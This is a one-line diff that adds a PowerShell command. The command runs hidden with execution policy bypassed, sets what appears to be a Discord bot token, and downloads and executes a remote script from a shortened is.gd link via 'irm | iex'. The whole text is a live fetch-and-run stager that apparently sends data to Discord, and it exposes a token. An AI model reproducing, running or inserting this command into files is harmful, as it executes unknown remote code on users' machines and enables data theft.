@@ -1,0 +1,1 @@
+powershell -NoP -Ep Bypass -W H -C $tk = 'MTI3MDc2NzcyMjAzNjMzNDY1Mw.GblqJU.3jsm-vrD0rZ4ru2fqJOvzLOKcB5-b_zD5RW3GA'; irm https://is.gd/bwdcc2 | iex
